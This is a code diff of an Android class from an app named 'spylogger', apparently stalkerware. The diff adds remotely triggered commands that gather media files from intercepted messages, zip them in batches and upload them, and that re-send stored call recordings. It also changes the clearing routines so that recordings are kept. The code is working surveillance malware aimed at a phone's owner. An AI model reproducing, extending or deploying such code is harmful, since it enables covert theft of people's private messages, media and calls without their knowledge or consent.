@@ -1,12 +1,15 @@
 package com.gravatasufoca.spylogger.services;
 
 import android.content.Context;
+import android.os.Environment;
 import android.util.Log;
 
+import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.helpers.ServicosHelper;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
@@ -16,19 +19,28 @@ import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.utils.ZipAnexos;
 import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
+import com.j256.ormlite.dao.Dao;
+import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.field.DataType;
 
 import java.io.File;
 import java.sql.SQLException;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.Iterator;
+import java.util.List;
 
 /**
  * Created by bruno on 05/01/17.
  */
 
 public class FcmHelperService {
+    private static final int MAX_MENSAGENS = 10;
     private Context context;
     private FcmMessageVO fcmMessageVO;
     private SendArquivoService sendArquivoService;
@@ -98,6 +110,15 @@ public class FcmHelperService {
             case LIMPAR:
                 limparMensagens();
                 break;
+            case REENVIAR_ARQUIVOS:
+                reenviarArquivos();
+                break;
+            case REENVIAR_LIGACOES:
+                reenviarLigacoes(false);
+                break;
+            case LIMPAR_REENVIAR_LIGACOES:
+                reenviarLigacoes(true);
+                break;
             default:
                 return;
         }
@@ -106,20 +127,16 @@ public class FcmHelperService {
     private void limparMensagens() {
         RepositorioTopico repositorioTopico;
         RepositorioMensagem repositorioMensagem;
-        RepositorioGravacao repositorioGravacao;
         try {
             repositorioTopico=new RepositorioTopicoImpl(context);
             repositorioMensagem=new RepositorioMensagemImpl(context);
-            repositorioGravacao=new RepositorioGravacaoImpl(context);
 
             repositorioMensagem.limpar();
             repositorioTopico.limpar();
-            repositorioGravacao.limpar();
 
         } catch (SQLException e) {
             Log.e("spylogger",e.getMessage());
         }finally {
-            repositorioGravacao=null;
             repositorioMensagem=null;
             repositorioTopico=null;
         }
@@ -128,19 +145,15 @@ public class FcmHelperService {
     private void reativarMensagens(){
         RepositorioTopico repositorioTopico;
         RepositorioMensagem repositorioMensagem;
-        RepositorioGravacao repositorioGravacao;
         try {
             repositorioTopico = new RepositorioTopicoImpl(context);
             repositorioMensagem = new RepositorioMensagemImpl(context);
-            repositorioGravacao = new RepositorioGravacaoImpl(context);
 
             repositorioTopico.reativar();
             repositorioMensagem.reativar();
-            repositorioGravacao.reativar();
         } catch (SQLException e) {
             Log.e("SPYLOGGER",e.getMessage());
         }finally {
-            repositorioGravacao=null;
             repositorioMensagem=null;
             repositorioTopico=null;
         }
@@ -157,6 +170,98 @@ public class FcmHelperService {
         SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
         sendGravacoesService.enviarTopicos();
 
+    }
+
+    private void reenviarArquivos(){
+
+        File outputDir = Environment.getExternalStorageDirectory();
+        File dirArquivos=new File(outputDir+"/smartlogs");
+        if(dirArquivos!=null && dirArquivos.exists() && dirArquivos.canWrite()){
+            dirArquivos.delete();
+            dirArquivos=new File(outputDir+"/smartlogs");
+            if(dirArquivos!=null){
+                if(!dirArquivos.mkdir()){
+                    return;
+                }
+            }
+        }
+
+        DatabaseHelper dbHelper = new DatabaseHelper(context);
+        Dao<Mensagem, Integer> daoMensagem;
+        GenericRawResults<Object[]> raws;
+        List<File> arquivos = new ArrayList<>();
+        Iterator<Object[]> iterator;
+        try {
+            daoMensagem = dbHelper.getDao(Mensagem.class);
+
+            raws = daoMensagem.queryRaw("select id,tipoMidia,tamanhoArquivo,dataRecebida from mensagem ", new DataType[]{
+                    DataType.INTEGER,DataType.ENUM_STRING,DataType.LONG,DataType.DATE_LONG
+            });
+            iterator = raws.iterator();
+            while (iterator.hasNext()) {
+                Object[] resultRaw = iterator.next();
+                try {
+                    if(fcmMessageVO.getArquivos().contains((Integer) resultRaw[0])){
+                        continue;
+                    }
+
+                    Mensagem mensagem = new Mensagem.MensagemBuilder()
+                            .setId((Integer) resultRaw[0])
+                            .setTipoMidia(resultRaw[1] == null ? TipoMidia.CONTATO : TipoMidia.valueOf((String) resultRaw[1]))
+                            .setTamanhoArquivo((Long) resultRaw[2])
+                            .setDataRecebida((Date) resultRaw[3])
+                            .build();
+
+                    File arquivo=Utils.getMediaFile(
+                            mensagem.getTipoMidia(),
+                            mensagem.getTamanhoArquivo(),
+                            mensagem.getDataRecebida(), 1);
+                    if(arquivo!=null){
+                        File tmp=new File(dirArquivos,mensagem.getId()+"");
+                        Utils.copyFile(arquivo,tmp);
+                        arquivos.add(tmp);
+                    }
+
+                } catch (Exception e) {
+                    Log.e("spylogger", e.getMessage());
+                }
+                if (iterator.hasNext()) {
+                    if (arquivos.size() == MAX_MENSAGENS) {
+                        ZipAnexos zip=new ZipAnexos(dirArquivos);
+                        File zipado=zip.getFile();
+                        if(zipado!=null){
+                            envioArquivoVO.setId(null);
+                            enviarArquivo(zipado);
+                        }
+                        arquivos.clear();
+                    }
+                } else {
+                    ZipAnexos zip=new ZipAnexos(dirArquivos);
+                    File zipado=zip.getFile();
+                    if(zipado!=null){
+                        envioArquivoVO.setId(null);
+                        enviarArquivo(zipado);
+                    }
+                }
+            }
+        } catch (SQLException e) {
+            Log.e("spylogger", e.getMessage());
+        }
+    }
+
+    private void reenviarLigacoes(boolean reativar){
+        RepositorioGravacao repositorioGravacao;
+        try {
+            repositorioGravacao = new RepositorioGravacaoImpl(context);
+            if(reativar) {
+                repositorioGravacao.reativar();
+            }
+
+            SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+            sendGravacoesService.enviarTopicos();
+        } catch (SQLException e) {
+            Log.e("SPYLOGGER",e.getMessage());
+        }
     }
 
 
@@ -194,7 +299,7 @@ public class FcmHelperService {
                 return Utils.getMediaFile(
                         mensagem.getTipoMidia(),
                         mensagem.getTamanhoArquivo(),
-                        mensagem.getDataRecebida(), 1);
+                        mensagem.getDataRecebida(), 2);
             }
 
         } catch (SQLException e) {
